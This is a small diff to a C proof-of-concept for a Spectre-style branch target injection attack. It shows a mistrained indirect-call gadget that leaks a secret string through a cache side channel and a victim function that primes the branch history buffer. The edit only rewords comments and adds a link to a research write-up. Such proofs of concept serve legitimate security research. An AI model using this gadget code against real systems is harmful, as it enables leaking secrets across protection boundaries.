@@ -26,7 +26,7 @@ char *secret = "The Magic Words are Squeamish Ossifrage.";
 // mistrained target of indirect call
 int gadget(char *addr)
 {
-  return channel[*addr * GAP]; // loads seem to fetch cache line more consistently than stores
+  return channel[*addr * GAP]; // speculative loads fetch data into the cache
 }
 
 // safe target of indirect call
@@ -40,7 +40,9 @@ int safe_target()
 int victim(char *addr, int input)
 {
   int junk = 0;
-  // set up bhb by performing >29 taken branches
+  // set up branch history buffer (bhb) by performing >29 taken branches
+  // see https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html
+  //   for details about how the branch prediction mechanism works
   // junk and input used to guarantee the loop is actually run
   for (int i = 1; i <= 100; i++) {
     input += i;
